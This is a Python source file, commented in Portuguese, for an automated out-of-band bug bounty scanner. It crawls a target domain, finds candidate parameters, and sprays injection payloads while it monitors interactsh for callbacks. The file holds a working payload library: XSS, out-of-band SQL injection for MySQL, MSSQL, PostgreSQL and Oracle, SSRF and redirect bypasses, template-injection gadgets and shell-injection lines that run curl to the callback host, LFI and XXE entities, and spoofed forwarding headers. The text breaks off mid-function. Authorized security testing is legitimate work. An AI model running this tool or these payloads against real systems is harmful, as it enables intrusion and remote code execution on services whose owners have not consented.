#!/usr/bin/env python3
"""
OOB Scanner v2 - Bug Bounty Automation Tool
Uso EXCLUSIVO em programas de Bug Bounty com escopo autorizado.

Dependências Go:
  go install github.com/lc/gau/v2/cmd/gau@latest
  go install github.com/jaeles-project/gospider@latest
  go install github.com/tomnomnom/waybackurls@latest
  go install github.com/tomnomnom/gf@latest
  go install github.com/projectdiscovery/httpx/cmd/httpx@latest
  go install github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest

Dependências Python:
  pip install requests urllib3

Uso rápido:
  python3 oob_scanner.py -d alvo.com -o abc123.oast.fun
  python3 oob_scanner.py -d alvo.com -o abc123.oast.fun --categories xss ssrf --delay 1.5
  python3 oob_scanner.py -d alvo.com -o abc123.oast.fun --skip-recon --threads 5
  python3 oob_scanner.py -d alvo.com -o abc123.oast.fun --poll --monitor-time 900
"""

import argparse
import subprocess
import sys
import os
import time
import json
import logging
import signal
import threading
import queue
import hashlib
import urllib.parse
import urllib.request
import secrets
import re
import shlex
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime, timezone
from pathlib import Path
from typing import Optional

try:
    import requests
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

# ─── Cores no terminal ────────────────────────────────────────────────────────
class C:
    RED     = "\033[91m"
    GREEN   = "\033[92m"
    YELLOW  = "\033[93m"
    BLUE    = "\033[94m"
    CYAN    = "\033[96m"
    MAGENTA = "\033[95m"
    BOLD    = "\033[1m"
    DIM     = "\033[2m"
    RESET   = "\033[0m"

    @staticmethod
    def strip(text: str) -> str:
        return re.sub(r'\033\[[0-9;]*m', '', text)

def banner():
    print(f"""{C.CYAN}{C.BOLD}
 ██████╗  ██████╗ ██████╗     ███████╗ ██████╗ █████╗ ███╗   ██╗
██╔═══██╗██╔═══██╗██╔══██╗    ██╔════╝██╔════╝██╔══██╗████╗  ██║
██║   ██║██║   ██║██████╔╝    ███████╗██║     ███████║██╔██╗ ██║
██║   ██║██║   ██║██╔══██╗    ╚════██║██║     ██╔══██║██║╚██╗██║
╚██████╔╝╚██████╔╝██████╔╝    ███████║╚██████╗██║  ██║██║ ╚████║
 ╚═════╝  ╚═════╝ ╚═════╝     ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝
{C.RESET}{C.DIM}  OOB Scanner v2  |  Bug Bounty  |  Apenas em alvos autorizados{C.RESET}
""")

# ─── Logger duplo: cores no terminal, texto limpo em arquivo ─────────────────
class CleanFileHandler(logging.FileHandler):
    def emit(self, record):
        record.msg = C.strip(str(record.msg))
        super().emit(record)

_log_lock = threading.Lock()

def setup_logging(output_dir: Path) -> logging.Logger:
    logger = logging.getLogger("oob")
    logger.setLevel(logging.DEBUG)
    logger.handlers.clear()

    fmt = logging.Formatter("%(asctime)s [%(levelname)s] %(message)s",
                            datefmt="%Y-%m-%d %H:%M:%S")

    fh = CleanFileHandler(output_dir / "oob_scanner.log", encoding="utf-8")
    fh.setLevel(logging.DEBUG)
    fh.setFormatter(fmt)

    ch = logging.StreamHandler(sys.stdout)
    ch.setLevel(logging.INFO)
    ch.setFormatter(logging.Formatter("%(message)s"))

    logger.addHandler(fh)
    logger.addHandler(ch)
    return logger

logger: logging.Logger = logging.getLogger("oob")

def log(msg: str, color: str = C.RESET, level: str = "info"):
    with _log_lock:
        getattr(logger, level)(f"{color}{msg}{C.RESET}")

# ─── UID collision-free ──────────────────────────────────────────────────────
_uid_seen: set[str] = set()
_uid_lock = threading.Lock()

def unique_id(category: str, param: str) -> str:
    """
    Gera UID globalmente único.
    Formato: cat3-timestamp_ms-6bytes_rand-param4  (≤ 40 chars)

    IMPORTANTE: para SSRF, o UID é usado como subdomínio (ex: uid.oob_host),
    por isso usa apenas chars válidos em DNS: [a-z0-9-].
    """
    cat  = re.sub(r'[^a-z0-9]', '', category.lower())[:3]
    par  = re.sub(r'[^a-z0-9]', '', param.lower())[:4]
    ts   = str(int(time.time() * 1000))
    rand = secrets.token_hex(3)

    uid = f"{cat}-{ts}-{rand}-{par}"

    with _uid_lock:
        while uid in _uid_seen:
            uid = f"{cat}-{ts}-{secrets.token_hex(3)}-{par}"
        _uid_seen.add(uid)

    return uid

# ─── Rate limiter global ─────────────────────────────────────────────────────
# FIX: delay anterior era por thread — com N threads = N*delay req/s.
# Agora é um semáforo global que garante no máximo 1 req a cada `delay` segundos,
# independente do número de threads.
class GlobalRateLimiter:
    def __init__(self, delay: float):
        self.delay = delay
        self._lock = threading.Lock()
        self._last = 0.0

    def acquire(self):
        with self._lock:
            now = time.time()
            gap = now - self._last
            if gap < self.delay:
                time.sleep(self.delay - gap)
            self._last = time.time()

_rate_limiter: GlobalRateLimiter = GlobalRateLimiter(0.3)  # default; sobrescrito em main()

# ─── Execução segura de subprocessos ─────────────────────────────────────────
def run_cmd(args: list[str], output_file: Optional[Path] = None,
            timeout: int = 300, stdin_data: str = "") -> str:
    """Executa comando como lista de argumentos (sem shell=True)."""
    log(f"  $ {' '.join(args)}", C.DIM, "debug")
    try:
        result = subprocess.run(
            args,
            input=stdin_data or None,
            capture_output=True,
            text=True,
            timeout=timeout,
        )
        out = result.stdout.strip()
        if output_file and out:
            output_file.write_text(out, encoding="utf-8")
        if result.returncode not in (0, 1) and result.stderr:
            log(f"  stderr: {result.stderr[:200]}", C.DIM, "debug")
        return out
    except subprocess.TimeoutExpired:
        log(f"Timeout ({timeout}s): {args[0]}", C.YELLOW, "warning")
        return ""
    except FileNotFoundError:
        log(f"Ferramenta não encontrada: {args[0]}", C.RED, "error")
        return ""
    except Exception as e:
        log(f"Erro em '{args[0]}': {e}", C.RED, "error")
        return ""

def run_shell(cmd: str, output_file: Optional[Path] = None,
              timeout: int = 300) -> str:
    """
    Versão shell=True para pipes complexos (cat | gf | sort).
    Usar APENAS com strings construídas internamente (sem input do usuário).
    """
    log(f"  $ {cmd}", C.DIM, "debug")
    try:
        result = subprocess.run(
            cmd, shell=True, capture_output=True, text=True, timeout=timeout
        )
        out = result.stdout.strip()
        if output_file and out:
            output_file.write_text(out, encoding="utf-8")
        return out
    except subprocess.TimeoutExpired:
        log(f"Timeout ({timeout}s): {cmd[:60]}", C.YELLOW, "warning")
        return ""
    except Exception as e:
        log(f"Erro: {e}", C.RED, "error")
        return ""

def check_tool(tool: str) -> bool:
    return subprocess.run(["which", tool], capture_output=True).returncode == 0

def check_dependencies(tools: list[str]) -> bool:
    missing = [t for t in tools if not check_tool(t)]
    if missing:
        log(f"Ferramentas ausentes: {', '.join(missing)}", C.RED, "error")
        log("Instale com Go conforme README.", C.YELLOW)
        return False
    log(f"Dependências OK: {', '.join(tools)}", C.GREEN)
    return True

# ─── Fase 1: Reconhecimento ──────────────────────────────────────────────────
def phase_recon(domain: str, out: Path) -> Path:
    log("\n━━━ FASE 1: Reconhecimento ━━━", C.BLUE + C.BOLD)

    if not check_dependencies(["gau", "gospider", "waybackurls", "httpx"]):
        sys.exit(1)

    raw_dir = out / "raw"
    raw_dir.mkdir(exist_ok=True)

    log("→ gau...", C.CYAN)
    run_cmd(["gau", "--threads", "5", "--blacklist", "png,jpg,gif,svg,css,woff",
             domain], raw_dir / "gau.txt", timeout=300)

    log("→ gospider...", C.CYAN)
    gs_raw = raw_dir / "gospider_raw"
    gs_raw.mkdir(exist_ok=True)
    run_cmd(["gospider", "-s", f"https://{domain}", "-d", "3", "-t", "10",
             "--quiet", "-o", str(gs_raw)], timeout=180)
    gs_file = raw_dir / "gospider.txt"
    run_shell(
        f"find {shlex.quote(str(gs_raw))} -type f | xargs cat 2>/dev/null "
        f"| grep -oP 'https?://[^\"\\s]+' | sort -u",
        gs_file
    )

    log("→ waybackurls...", C.CYAN)
    run_cmd(["waybackurls", domain], raw_dir / "waybackurls.txt", timeout=300)

    all_urls_file = out / "all_urls.txt"
    all_urls: set[str] = set()
    for f in raw_dir.glob("*.txt"):
        try:
            for line in f.read_text(encoding="utf-8", errors="ignore").splitlines():
                line = line.strip()
                if line and not re.search(
                    r'\.(png|jpg|jpeg|gif|svg|ico|css|woff|woff2|ttf|eot|mp4|mp3|pdf)(\?|$)',
                    line, re.I
                ):
                    all_urls.add(line)
        except Exception:
            pass

    all_urls_file.write_text("\n".join(sorted(all_urls)), encoding="utf-8")
    log(f"  URLs brutas (deduplicadas): {len(all_urls)}", C.GREEN)

    log("→ httpx validando endpoints vivos...", C.CYAN)
    live_file = out / "live_urls.txt"
    run_cmd(
        ["httpx", "-l", str(all_urls_file), "-silent", "-threads", "50",
         "-timeout", "10", "-mc", "200,201,301,302,403,405"],
        live_file, timeout=600
    )

    live_count = len(live_file.read_text().splitlines()) if live_file.exists() else 0
    log(f"  Endpoints vivos: {live_count}", C.GREEN)
    return live_file

def phase_gf(live_urls_file: Path, out: Path) -> dict[str, Path]:
    log("\n━━━ Filtrando com gf ━━━", C.BLUE + C.BOLD)

    if not check_tool("gf"):
        log("gf não encontrado — pulando filtragem.", C.YELLOW, "warning")
        return {}

    # FIX: verifica quais padrões estão realmente instalados antes de rodar.
    # Padrões como 'idor' e 'xxe' não fazem parte do conjunto padrão do tomnomnom/gf.
    available_patterns = set(run_shell("gf --list 2>/dev/null").splitlines())

    gf_dir = out / "gf"
    gf_dir.mkdir(exist_ok=True)

    categories = {
        "xss":      "xss",
        "sqli":     "sqli",
        "ssrf":     "ssrf",
        "ssti":     "ssti",
        "redirect": "redirect",
        "rce":      "rce",
        "lfi":      "lfi",
        "idor":     "idor",
        "xxe":      "xxe",
    }

    files: dict[str, Path] = {}
    for cat, gf_pattern in categories.items():
        # FIX: pula silenciosamente padrões não instalados em vez de gerar 0 resultados
        # sem aviso, o que mascara a causa.
        if available_patterns and gf_pattern not in available_patterns:
            log(f"  [{cat.upper():8}] padrão gf '{gf_pattern}' não instalado — pulando", C.YELLOW, "warning")
            continue

        out_file = gf_dir / f"gf_{cat}.txt"
        # FIX: usa subprocess com stdin em vez de shell=True para evitar
        # qualquer risco de injeção via path do arquivo.
        try:
            with open(live_urls_file) as fin:
                result = subprocess.run(
                    ["gf", gf_pattern],
                    stdin=fin,
                    capture_output=True,
                    text=True,
                    timeout=120,
                )
            output = result.stdout.strip()
        except Exception as e:
            log(f"  [{cat.upper():8}] erro ao executar gf: {e}", C.RED, "error")
            continue

        if output:
            out_file.write_text(output, encoding="utf-8")
            count = len(output.splitlines())
            log(f"  [{cat.upper():8}] {count:4d} endpoints", C.GREEN)
            files[cat] = out_file
        else:
            log(f"  [{cat.upper():8}]    0 endpoints", C.DIM)

    return files

# ─── Fase 2: Payloads ────────────────────────────────────────────────────────
#
# Convenções de substituição:
#   {OOB}  → hostname do interactsh (ex: abc.oast.fun)
#   {ID}   → UID único gerado por unique_id()
#
# Para SSRF e DNS OOB, o UID é colocado como SUBDOMÍNIO ({ID}.{OOB}) e não
# como path, porque o interactsh registra o host no campo 'full-id' — que é
# indexado para correlação. O path não aparece no full-id de hits DNS.
#
PAYLOADS: dict[str, list[str]] = {
    "xss": [
        '"><img src="https://{OOB}/{ID}" onerror=alert(1)>',
        "'><script src=https://{OOB}/{ID}></script>",
        '"><svg/onload=fetch(`https://{OOB}/{ID}`)>',
        '"><details open ontoggle=fetch(`https://{OOB}/{ID}`)>',
        "javascript:fetch('https://{OOB}/{ID}')//?",
    ],
    "sqli": [
        # MySQL — OOB via LOAD_FILE com UNC path + subdomínio como UID
        # (subdomínio garante correlação DNS no interactsh)
        "' AND 1=1 AND LOAD_FILE(CONCAT('\\\\\\\\','{ID}','.{OOB}','\\\\a'))-- -",
        # MSSQL — xp_dirtree via UNC com subdomínio
        "'; EXEC master..xp_dirtree '\\\\{ID}.{OOB}\\share';-- -",
        # PostgreSQL — OOB via dblink (requer extensão instalada)
        "'; SELECT dblink_connect('host={ID}.{OOB} dbname=a user=a');-- -",
        # Oracle — UTL_HTTP com subdomínio
        "' AND 1=(SELECT UTL_HTTP.REQUEST('https://{ID}.{OOB}/') FROM dual)-- -",
        # MySQL — Blind time + OOB combo (LOAD_FILE com subdomínio)
        "' AND SLEEP(0) AND 1=(SELECT 1 FROM (SELECT LOAD_FILE(CONCAT('\\\\\\\\','{ID}','.{OOB}','\\\\a')))x)-- -",
    ],
    "ssrf": [
        # FIX: UID como subdomínio para correlação DNS confiável no interactsh.
        # O hit DNS traz full-id = "{ID}.{OOB}" → find_fuzzy() localiza o payload.
        "https://{ID}.{OOB}/",
        "http://{ID}.{OOB}/",
        # Bypasses de validação com subdomínio
        "http://{ID}.{OOB}%2F",
        "dict://{ID}.{OOB}:80/",
        "ftp://{ID}.{OOB}/",
        # Bypass por fragmento e querystring (validadores ingênuos)
        "https://legit.com#{ID}.{OOB}",
        "https://legit.com@{ID}.{OOB}/",
        # Bypass por path traversal
        "//\t{ID}.{OOB}/",
    ],
    "ssti": [
        # Jinja2 / Python
        "{{''.__class__.__mro__[1].__subclasses__()[407](['curl','https://{ID}.{OOB}/'],stdout=-1).communicate()}}",
        # Freemarker (Java)
        '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("curl https://{ID}.{OOB}/")}',
        # Pebble (Java)
        "{% set cmd = 'curl https://{ID}.{OOB}/' %}{{ cmd }}",
        # Twig (PHP)
        "{{['curl https://{ID}.{OOB}/']|filter('system')}}",
        # ERB (Ruby)
        "<%= `curl https://{ID}.{OOB}/` %>",
        # Velocity (Java)
        "#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($ex=$rt.getRuntime().exec('curl https://{ID}.{OOB}/'))$ex",
    ],
    "redirect": [
        "https://{ID}.{OOB}/",
        "//https://{ID}.{OOB}/",
        "//{ID}.{OOB}/",
        "https://{ID}.{OOB}%2F",
        "https:/%5C%5C{ID}.{OOB}/",
        "https://{ID}.{OOB};@legit.com/",
        "@{ID}.{OOB}/",
    ],
    "rce": [
        "; curl https://{ID}.{OOB}/ #",
        "| curl https://{ID}.{OOB}/",
        "`curl https://{ID}.{OOB}/`",
        "$(curl https://{ID}.{OOB}/)",
        "%3B+curl+https%3A%2F%2F{ID}.{OOB}%2F",
        "\ncurl https://{ID}.{OOB}/\n",
        # PowerShell (Windows)
        "; Invoke-WebRequest https://{ID}.{OOB}/ #",
    ],
    "lfi": [
        # Wrapper PHP com OOB
        "php://filter/convert.base64-encode/resource=https://{ID}.{OOB}/",
        # expect:// executa comando
        "expect://curl https://{ID}.{OOB}/",
        # Bypass null byte (PHP < 5.3)
        "../../etc/passwd%00https://{ID}.{OOB}/",
        # FIX: removido "php://input" — sem implementação de POST com body,
        # era enviado como GET e nunca gerava hit OOB.
    ],
    "xxe": [
        # Standard HTTP OOB com subdomínio
        '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "https://{ID}.{OOB}/">]><r>&x;</r>',
        # Parâmetro entity (blind XXE)
        '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % oob SYSTEM "https://{ID}.{OOB}/">%oob;]>',
        # SVG XXE
        '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xl="http://www.w3.org/1999/xlink"><image xl:href="https://{ID}.{OOB}/"/></svg>',
    ],
    # FIX: removidos "ssrf_header" (lista vazia — nunca gerava tasks) e "idor"
    # (payloads idênticos ao ssrf). Headers OOB são injetados automaticamente
    # para ssrf/rce/lfi/xxe via OOB_HEADERS abaixo. IDOR pode ser testado
    # adicionando o padrão gf 'idor' e reutilizando payloads ssrf.
}

# Cabeçalhos HTTP para injeção OOB (SSRF via header).
# FIX: usa subdomínio {ID}.{OOB} nos valores — correlação DNS garantida.
OOB_HEADERS: list[tuple[str, str]] = [
    ("X-Forwarded-For",           "{ID}.{OOB}"),
    ("X-Real-IP",                 "{ID}.{OOB}"),
    ("Referer",                   "https://{ID}.{OOB}/"),
    ("X-Forwarded-Host",          "{ID}.{OOB}"),
    ("X-Original-URL",            "https://{ID}.{OOB}/"),
    ("X-Custom-IP-Authorization", "{ID}.{OOB}"),
    ("X-Originating-IP",          "{ID}.{OOB}"),
    ("True-Client-IP",            "{ID}.{OOB}"),
    ("CF-Connecting-IP",          "{ID}.{OOB}"),
    ("X-Host",                    "{ID}.{OOB}"),
    ("Forwarded",                 "for={ID}.{OOB};by={ID}.{OOB}"),
]

# ─── PayloadLog — O(1) lookup por uid ────────────────────────────────────────
class PayloadLog:
    def __init__(self, log_file: Path):
        self.log_file = log_file
        self._by_uid: dict[str, dict] = {}
        self._all:    list[dict]      = []
        self._lock    = threading.Lock()

    @property
    def entries(self) -> list[dict]:
        with self._lock:
            return list(self._all)

    def record(self, uid: str, url: str, param: str,
               category: str, payload: str) -> dict:
        entry = {
            "uid":       uid,
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "unix_ts":   int(time.time() * 1000),
            "category":  category,
            "url":       url,
            "param":     param,
            "payload":   payload,
        }
        with self._lock:
            self._by_uid[uid] = entry
            self._all.append(entry)
            with open(self.log_file, "a", encoding="utf-8") as f:
                f.write(json.dumps(entry) + "\n")
        return entry

    def find_by_uid(self, uid: str) -> Optional[dict]:
        with self._lock:
            return self._by_uid.get(uid)

    def find_fuzzy(self, raw_id: str) -> Optional[dict]:
        """
        Busca por substring no raw_id do interactsh.

        Com UIDs como subdomínio ({ID}.{OOB}), o interactsh retorna
        full-id = "{ID}.{OOB}" e o UID está no início — find_fuzzy bate certeiro.

        FIX: também varre raw_request para categorias onde o UID pode ter
        chegado via HTTP path em vez de subdomínio DNS.
        """
        with self._lock:
            for uid, entry in self._by_uid.items():
                if uid in raw_id:
                    return entry
        return None

    def find_fuzzy_in_request(self, raw_request: str) -> Optional[dict]:
        """Fallback: varre o corpo do raw_request procurando qualquer UID."""
        with self._lock:
            for uid, entry in self._by_uid.items():
                if uid in raw_request:
                    return entry
        return None

# ─── HTTP com session pooling ─────────────────────────────────────────────────
def make_session(proxy: str = "") -> "requests.Session":
    s = requests.Session()
    adapter = requests.adapters.HTTPAdapter(
        pool_connections=20,
        pool_maxsize=50,
        max_retries=0,
    )
    s.mount("http://", adapter)
    s.mount("https://", adapter)
    if proxy:
        s.proxies = {"http": proxy, "https": proxy}
    return s

def send_payload(session, url: str, headers: dict,
                 timeout: int = 8) -> str:
    """Envia GET com payload e retorna HTTP status code."""
    if not HAS_REQUESTS:
        h_args = []
        for k, v in headers.items():
            h_args += ["-H", f"{k}: {v}"]
        result = run_cmd(
            ["curl", "-sk", "--max-time", str(timeout),
             "-o", "/dev/null", "-w", "%{http_code}",
             *h_args, url],
            timeout=timeout + 5
        )
        return result.strip()
    try:
        r = session.get(url, headers=headers, timeout=timeout,
                        verify=False, allow_redirects=False)
        return str(r.status_code)
    except requests.exceptions.Timeout:
        return "TMO"
    except requests.exceptions.ConnectionError:
        return "ERR"
    except Exception:
        return "???"

# ─── Extração e injeção de parâmetros ────────────────────────────────────────
def extract_params(url: str) -> list[str]:
    try:
        parsed = urllib.parse.urlparse(url)
        return list(urllib.parse.parse_qs(parsed.query, keep_blank_values=True).keys())
    except Exception:
        return []

def inject_param(url: str, param: str, value: str) -> str:
    """
    Substitui o valor de um parâmetro específico na URL.

    FIX: trata o caso especial "__path__" — quando não há query string,
    adiciona o payload como novo parâmetro em vez de retornar a URL intacta,
    o que antes causava o envio do payload para o destino errado.
    """
    if param == "__path__":
        sep = "&" if "?" in url else "?"
        return f"{url}{sep}oob={urllib.parse.quote(value, safe='')}"

    try:
        parsed = urllib.parse.urlparse(url)
        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        qs[param] = [value]
        new_qs = urllib.parse.urlencode(qs, doseq=True)
        return urllib.parse.urlunparse(parsed._replace(query=new_qs))
    except Exception:
        return url

# ─── Fase 2: Injeção (multi-thread + rate limiter global) ────────────────────
def _inject_one(task: dict, session, plog: PayloadLog, oob_host: str,
                proxy: str) -> dict:
    uid = unique_id(task["category"], task["param"])
    payload = (task["payload_template"]
               .replace("{OOB}", oob_host)
               .replace("{ID}", uid))

    if task["param"] == "__header__":
        injected_url = task["url"]
        hdr_name     = task["header_name"]
        headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            hdr_name: payload,
        }
    else:
        injected_url = inject_param(task["url"], task["param"], payload)
        headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
        }

    sent_at = datetime.now(timezone.utc).strftime("%H:%M:%S")
    plog.record(uid, task["url"], task["param"], task["category"], payload)

    # FIX: rate limiter global — garante delay real entre requisições,
    # independente do número de threads em paralelo.
    _rate_limiter.acquire()
    code = send_payload(session, injected_url, headers)

    return {
        "uid":      uid,
        "sent_at":  sent_at,
        "category": task["category"],
        "param":    task["param"],
        "url":      task["url"][:70],
        "code":     code,
    }

def phase_inject(category_files: dict[str, Path], oob_host: str, out: Path,
                 plog: PayloadLog, delay: float, threads: int,
                 proxy: str = "") -> int:
    log("\n━━━ FASE 2: Injeção de Payloads OOB ━━━", C.BLUE + C.BOLD)

    if not HAS_REQUESTS:
        log("requests não instalado — usando curl como fallback (mais lento).", C.YELLOW, "warning")

    tasks: list[dict] = []
    _seen_tasks: set[tuple] = set()

    def _url_base(url: str) -> str:
        try:
            p = urllib.parse.urlparse(url)
            params = sorted(urllib.parse.parse_qs(p.query, keep_blank_values=True).keys())
            normalized_qs = "&".join(f"{k}=" for k in params)
            return urllib.parse.urlunparse(p._replace(query=normalized_qs, fragment=""))
        except Exception:
            return url

    for category, gf_file in category_files.items():
        if category not in PAYLOADS or not gf_file.exists():
            continue

        raw_urls = [u.strip() for u in gf_file.read_text().splitlines() if u.strip()]
        raw_urls = list(dict.fromkeys(raw_urls))

        seen_bases: dict[str, str] = {}
        for url in raw_urls:
            base = _url_base(url)
            key  = (category, base)
            if key not in seen_bases:
                seen_bases[key] = url

        deduped_urls = list(seen_bases.values())
        skipped = len(raw_urls) - len(deduped_urls)
        if skipped:
            log(f"  [{category.upper():8}] {len(deduped_urls)} endpoints únicos "
                f"({skipped} duplicatas de base descartadas)", C.DIM)

        for url in deduped_urls:
            params = extract_params(url)
            if not params:
                params = ["__path__"]

            for param in params:
                for tpl in PAYLOADS[category]:
                    tpl_key = (category, _url_base(url), param,
                               PAYLOADS[category].index(tpl))
                    if tpl_key in _seen_tasks:
                        continue
                    _seen_tasks.add(tpl_key)
                    tasks.append({
                        "url": url, "param": param,
                        "category": category, "payload_template": tpl,
                    })

            if category in ("ssrf", "rce", "lfi", "xxe"):
                for hdr_name, hdr_tpl in OOB_HEADERS:
                    hdr_key = (f"{category}_hdr", _url_base(url), hdr_name)
                    if hdr_key in _seen_tasks:
                        continue
                    _seen_tasks.add(hdr_key)
                    tasks.append({
                        "url": url, "param": "__header__",
                        "category": f"{category}_hdr",
                        "payload_template": hdr_tpl,
                        "header_name": hdr_name,
                    })

    total = len(tasks)
    log(f"  Tasks geradas: {total} "
        f"({len(category_files)} categorias, {threads} threads)", C.CYAN)
    log(f"  Rate limit   : 1 req / {_rate_limiter.delay}s (global, não por thread)", C.DIM)

    if total == 0:
        log("  Nenhuma task — verifique se os arquivos gf têm conteúdo.", C.YELLOW, "warning")
        return 0

    results_file = out / "injection_results.jsonl"
    sent = 0
    errors = 0

    _local = threading.local()

    def get_session():
        if not hasattr(_local, "session"):
            _local.session = make_session(proxy) if HAS_REQUESTS else None
        return _local.session

    def worker(task):
        return _inject_one(task, get_session(), plog, oob_host, proxy)

    with ThreadPoolExecutor(max_workers=threads) as ex:
        futures = {ex.submit(worker, t): t for t in tasks}
        for fut in as_completed(futures):
            try:
                # FIX: timeout por future — evita thread presa em endpoint que
                # aceita conexão mas nunca responde (além do timeout do requests).
                res = fut.result(timeout=30)
                sent += 1
                color = C.GREEN if res["code"] in ("200","201","301","302") else C.DIM
                log(f"  {res['sent_at']} [{res['uid'][:30]}] {res['param']:12} "
                    f"HTTP {res['code']} → {res['url']}", color)
                with open(results_file, "a", encoding="utf-8") as f:
                    f.write(json.dumps(res) + "\n")
            except TimeoutError:
                errors += 1
                log(f"  Task excedeu timeout máximo (30s)", C.YELLOW, "warning")
            except Exception as e:
                errors += 1
                log(f"  Erro em task: {e}", C.RED, "warning")

    log(f"\n  Enviados: {sent} | Erros: {errors}", C.GREEN + C.BOLD)
    return sent

# ─── Fase 3: Monitoramento interactsh ────────────────────────────────────────
def phase_monitor(oob_host: str, plog: PayloadLog, out: Path,
                  duration: int = 300, parallel: bool = False):
    if parallel:
        t = threading.Thread(
            target=_monitor_loop,
            args=(oob_host, plog, out, duration),
            daemon=True,
            name="monitor",
        )
        t.start()
        return t
    else:
        _monitor_loop(oob_host, plog, out, duration)
        return None

def _monitor_loop(oob_host: str, plog: PayloadLog,
                  out: Path, duration: int):
    log("\n━━━ FASE 3: Monitorando OOB callbacks ━━━", C.BLUE + C.BOLD)
    log(f"  Host  : {oob_host}", C.CYAN)
    log(f"  Tempo : {duration}s  |  Ctrl+C para encerrar", C.DIM)

    hits_file    = out / "oob_hits.jsonl"
    summary_file = out / "oob_hits_summary.txt"

    if not check_tool("interactsh-client"):
        log("  interactsh-client não encontrado.", C.YELLOW, "warning")
        _manual_poll_hint(oob_host, out)
        return

    log("  Iniciando interactsh-client...", C.CYAN)

    cmd = ["interactsh-client", "-json", "-poll-interval", "5"]
    if not re.search(r"oast\.(fun|me|live|online)", oob_host):
        cmd += ["-server", oob_host]

    proc = subprocess.Popen(
        cmd,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
        bufsize=1,
    )

    def drain_stderr():
        for raw in proc.stderr:
            raw = raw.strip()
            if not raw:
                continue
            lvl   = "debug"
            color = C.DIM
            low   = raw.lower()
            if any(k in low for k in ("error", "failed", "invalid", "refused")):
                lvl   = "warning"
                color = C.YELLOW
            log(f"  [interactsh] {raw}", color, lvl)

    threading.Thread(target=drain_stderr, daemon=True, name="iactsh-stderr").start()

    def _countdown():
        remaining = duration
        while remaining > 0 and proc.poll() is None:
            time.sleep(10)
            remaining -= 10
            if remaining > 0:
                log(f"  ⏱  {remaining}s restantes no monitor...", C.DIM)

    threading.Thread(target=_countdown, daemon=True, name="iactsh-timer").start()

    start  = time.time()
    hits: list[dict] = []

    try:
        while time.time() - start < duration:
            line = proc.stdout.readline()

            if not line:
                if proc.poll() is not None:
                    log("  interactsh-client encerrou inesperadamente.", C.RED, "error")
                    break
                time.sleep(0.3)
                continue

            line = line.strip()
            if not line:
                continue

            if line.startswith("["):
                low = line.lower()
                if any(k in low for k in ("error", "failed", "invalid")):
                    log(f"  ⚠ {line}", C.YELLOW, "warning")
                else:
                    log(f"  {line}", C.DIM, "debug")
                continue

            try:
                data = json.loads(line)
            except json.JSONDecodeError:
                log(f"  [stdout não-JSON] {line[:120]}", C.DIM, "debug")
                continue

            if "protocol" not in data and "unique-id" not in data:
                continue

            _process_hit(data, plog, hits, hits_file)

    except KeyboardInterrupt:
        log("\n  Monitor encerrado pelo usuário.", C.YELLOW)
    finally:
        proc.terminate()
        try:
            proc.wait(timeout=3)
        except subprocess.TimeoutExpired:
            proc.kill()

    _write_summary(hits, plog, summary_file)

def _parse_interactsh_ts(ts_str: str) -> Optional[float]:
    """
    Converte timestamp RFC3339 com nanosegundos para float unix.
    Ex: "2026-05-25T15:33:20.106317855Z" → 1748183600.106317
    """
    if not ts_str:
        return None
    try:
        ts_norm = re.sub(r'(\.\d{6})\d+(Z?)$', r'\1\2', ts_str)
        ts_norm = ts_norm.replace("Z", "+00:00")
        return datetime.fromisoformat(ts_norm).timestamp()
    except Exception:
        return None

def _process_hit(data: dict, plog: PayloadLog,
                 hits: list, hits_file: Path):
    """
    Processa um hit JSON do interactsh-client v1.3+.

    Campos relevantes:
      protocol      : "dns" | "http" | "smtp" | ...
      unique-id     : ID base do host interactsh
      full-id       : ID completo (inclui subdomínio = nosso UID)
      q-type        : "A" | "AAAA" | "MX" ... (DNS)
      raw-request   : requisição recebida (HTTP/SMTP)
      remote-address: IP de quem fez a requisição OOB
      timestamp     : RFC3339 com nanosegundos
    """
    raw_id      = data.get("full-id", data.get("unique-id", ""))
    protocol    = data.get("protocol", "unknown").upper()
    remote_addr = data.get("remote-address", "?")
    raw_request = data.get("raw-request", "")
    q_type      = data.get("q-type", "")

    hit_ts_str  = data.get("timestamp", "")
    hit_ts_unix = _parse_interactsh_ts(hit_ts_str) or time.time()
    received_at = hit_ts_str or datetime.now(timezone.utc).isoformat()

    proto_label = f"{protocol}/{q_type}" if q_type else protocol

    log(f"\n{'━'*60}", C.RED + C.BOLD)
    log(f"  🎯  OOB HIT RECEBIDO!", C.RED + C.BOLD)
    log(f"  Protocolo  : {proto_label}",  C.YELLOW)
    log(f"  Remote IP  : {remote_addr}",  C.YELLOW)
    log(f"  Full-ID    : {raw_id}",       C.YELLOW)
    log(f"  Timestamp  : {received_at}",  C.YELLOW)

    if raw_request:
        first_line = raw_request.split("\n")[0].strip()
        if first_line:
            log(f"  Request    : {first_line[:120]}", C.YELLOW)

    # FIX: correlação em dois passos.
    # 1. Tenta pelo full-id (DNS — UID está no subdomínio → funciona 100%).
    # 2. Fallback: varre raw_request (HTTP — UID pode estar no path ou body).
    matched = plog.find_fuzzy(raw_id)
    if not matched and raw_request:
        matched = plog.find_fuzzy_in_request(raw_request)
        if matched:
            log(f"  (correlação via raw_request)", C.DIM, "debug")

    delay_str = "?"
    if matched:
        sent_ts_unix = matched["unix_ts"] / 1000.0
        delay_s      = hit_ts_unix - sent_ts_unix
        if delay_s < 0:
            delay_str = f"~{abs(delay_s):.1f}s (clock skew?)"
        elif delay_s > 3600:
            delay_str = f"{delay_s/3600:.1f}h"
        elif delay_s > 60:
            delay_str = f"{delay_s/60:.1f}min"
        else:
            delay_str = f"{delay_s:.1f}s"

